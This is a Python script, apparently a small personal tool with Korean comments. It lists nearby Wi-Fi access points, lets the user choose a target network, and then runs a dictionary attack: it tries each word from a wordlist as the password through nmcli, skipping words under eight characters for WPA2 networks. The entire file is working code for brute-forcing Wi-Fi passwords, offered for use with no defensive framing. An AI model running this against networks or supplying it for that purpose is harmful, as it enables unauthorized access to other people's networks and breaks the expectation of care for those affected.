import re
import pandas as pd
import subprocess
from access_points import get_scanner
from time import sleep, time

class Finder:
    def __init__(self, *args, **kwargs):
        self.ssid = kwargs['ssid']
        self.password = kwargs['password']
        self.main_dict = {}

    def run(self):
        try:
            subprocess.run([ "nmcli", "d", "wifi", "connect", self.ssid, "password", self.password ], timeout=0.5)
        except Exception as exp:
            print("Couldn't connect to name : {}. {}".format(self.ssid, exp))
        sleep(0.5)

if __name__ == "__main__":    
    # AP scanning
    wifi_scanner = get_scanner()
    aps = wifi_scanner.get_access_points()
    for idx, item in enumerate(aps):
        print(idx, item.ssid, item.security)

    # select target AP
    x = (int)(input("select ssid: "))
    
    # WPA2의 경우 최소 8자리 제한 설정
    WPA2 = re.compile('WPA2')
    ssid = aps[x].ssid
    isWPA2 = (bool)(WPA2.match((str)(aps[x].security)))
    print("\n\n ssid: {} \n WPA2: {}".format( ssid, isWPA2 ))
    
    # load dictionary file
    data = pd.read_csv('engdic.txt', sep="\n", header=None)
    
    starttime = time()
    try:
        for item in range(len(data)):
            password = data.iloc[item][0]
            print(password)
            if(isWPA2 and len(password) < 8):
                continue
            F = Finder(ssid=ssid, password=password)
            F.run()
    except:
        print("execution time: {}sec".format(round((time() - starttime), 2)))
